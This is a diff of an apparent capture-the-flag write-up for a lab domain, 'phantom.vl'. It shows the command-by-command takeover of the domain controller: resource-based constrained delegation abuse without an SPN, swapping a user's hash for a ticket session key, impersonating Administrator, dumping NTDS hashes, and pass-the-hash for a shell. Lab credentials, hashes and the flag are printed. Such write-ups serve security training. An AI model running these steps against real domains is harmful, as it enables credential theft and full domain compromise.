@@ -450,30 +450,31 @@ msDS-AllowedToActOnBehalfOfOtherIdentity.ACL.Flags: CONTAINER_INHERIT; OBJECT_IN
 
 With this in place, we need `wsilva`’s Ticket Granting Ticket (TGT) and its session key to manipulate the password hash.
 
-**Command:** `getTGT.py phantom.vl/wsilva:Summer2025 -dc-ip 10.129.234.63` and `export KRB5CCNAME=wsilva.ccache` to save it to our credential cache.
+**Command:** `NTLM=$(echo -n 'Summer2025' | iconv -f UTF-8 -t UTF-16LE | openssl dgst -md4 | awk '{print $2}')` 
+
+This will calculate the NTLM hash of `Summer2025`, by converting it from UTF-8 to UTF-16LE with `iconv`, which is then piped to `openssl` to generate an md4 hash (NTLM), which awk will then grab and set as our `$NTLM` variable.
+
+You may not need to do this, in my case, I needed to force a RC4-based TGT, which should yield a 32-character session key, as a plaintext password `Summer2025` generates AES256 64-character key, which is not compatible with the next steps.
+
 ```
-[*] Saving ticket in wsilva.ccache
+echo $NTLM
+5f695056521900e992a6366aabb446a3
+```
+With our NTLM hash, we can now proceed with requesting a TGT.
+
+**Command:** `getTGT.py -hashes :$NTLM phantom.vl/wsilva -dc-ip 10.129.234.63`
+
+This next step is **critical**, we must change `wsilva`’s Password Hash to the TGT Session Key, which will enable S4U2self + U2U without an SPN, completing our RBCD requirements.
+
+First we'll extract our session key from our TGT, which we can quickly grep with the following.
+
+**Command:** `describeTicket.py wsilva.ccache | grep 'Ticket Session Key`
+```
+[*] Ticket Session Key            : 098710b2cb0989cb38839638c24cd154
 ```
 
-The next step is **critical**, we must change `wsilva`’s Password Hash to the TGT Session Key, which will enable S4U2self + U2U without an SPN, completing our RBCD requirements.
-
-First we'll extract our session key from our TGT. 
-
-**Command:** `describeTicket.py wsilva.ccache` 
-```
-[*] Ticket Session Key            : 94c49d9c951a25276eefa5085c15070451b4ec61ed4d0f9f5681eb75a8777326
-[*] User Name                     : wsilva
-[*] User Realm                    : PHANTOM.VL
-[*] Service Name                  : krbtgt/PHANTOM.VL
-[*] Service Realm                 : PHANTOM.VL
-[*] Start Time                    : 17/10/2025 12:11:33 PM
-[*] End Time                      : 17/10/2025 22:11:33 PM
-[*] RenewTill                     : 18/10/2025 12:11:21 PM
-[*] Flags                         : (0x50e10000) forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep
-```
-
-Using `changepasswd.py` we can cleanly handle setting the password as a hash. Note that this will now make the user account unusable.
-**Command:** `changepasswd.py -newhashes 6c3573ab3a425e01ca61dacb45505c8ebd384fe9756594b04fa392741c324ee9 phantom.vl/wsilva@10.129.234.63`
+Using `changepasswd.py` we can cleanly handle setting the password as our NTLM hash. Note that this will break normal user functionality.
+**Command:** `changepasswd.py -newhashes :098710b2cb0989cb38839638c24cd154 phantom.vl/wsilva:Summer2025@10.129.234.63`
 ```
 [*] Changing the password of phantom.vl\wsilva
 [*] Connecting to DCE/RPC as phantom.vl\wsilva
@@ -481,23 +482,44 @@ Using `changepasswd.py` we can cleanly handle setting the password as a hash. No
 [!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
 ```
 
+With this set, our user account now is effectively a service account, but without needing an spn, meaning all of our steps are now complete to impersonate Administrator. Again, I absolutely recommend reading [this]([James Forshaw](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)) to understand how this works.
+`KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass`
+```
+Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies
 
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
+```
+`getST.py` is used to request a kerberos service ticket 
+`-u2u` enables the User-to-User kerberos protocol, which allows a user to authenticate to another user or service using a TGT.
+`impersonate Administrator` here we specifcy the service ticket should be requested on behalf of the Administrator account, leveraging S4U2self.
+`-spn cifs/DC.phantom.vl` requests a service ticket for cifs for the DC, which we'll leverage to use SMB later.
+`-k -no-pass` is just to indicate we want to use our .ccache and not a password.
 
+We now effectively have free reign as Administrator, to quickly gain as shell over winrm, we can dump `Administrator`'s hash straight from ntds.
+**Command:** `KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache nxc smb dc.phantom.vl --use-kcache --ntds --user Administrator`
 
+```
+KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache nxc smb dc.phantom.vl --use-kcache --ntds --user Administrator
+SMB         dc.phantom.vl   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) (Null Auth:True)
+SMB         dc.phantom.vl   445    DC               [+] phantom.vl\Administrator from ccache (admin)
+SMB         dc.phantom.vl   445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc.phantom.vl   445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa2abd9db4f5984e657f834484512117:::
+SMB         dc.phantom.vl   445    DC               [+] Dumped 1 NTDS hashes to /root/.nxc/logs/ntds/dc.phantom.vl_None_2025-10-17_130531.ntds of which 1 were added to the database
+SMB         dc.phantom.vl   445    DC               [*] To extract only enabled accounts from the output file, run the following command:
+SMB         dc.phantom.vl   445    DC               [*] cat /root/.nxc/logs/ntds/dc.phantom.vl_None_2025-10-17_130531.ntds | grep -iv disabled | cut -d ':' -f1
+SMB         dc.phantom.vl   445    DC               [*] grep -iv disabled /root/.nxc/logs/ntds/dc.phantom.vl_None_2025-10-17_130531.ntds | cut -d ':' -f1
+```
 
+**Command:** `evil-winrm -i dc.phantom.vl -u administrator -H aa2abd9db4f5984e657f834484512117`
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+60d108263adf1769459769c8ddb6efab
+```
 
-
-
-
-
-
-
-
-
-
-
-
-
+Root flag obtained.
 
 
 ### Summary
@@ -505,12 +527,6 @@ Using `changepasswd.py` we can cleanly handle setting the password as a hash. No
 *   **Initial Access**: (Details to be filled in after exploitation)
 *   **Lateral Movement**: (Details to be filled in)
 *   **Domain Admin**: (Details to be filled in)
-
-### Post-Exploitation
-
-
-
-
 
 
 ### Mitigations
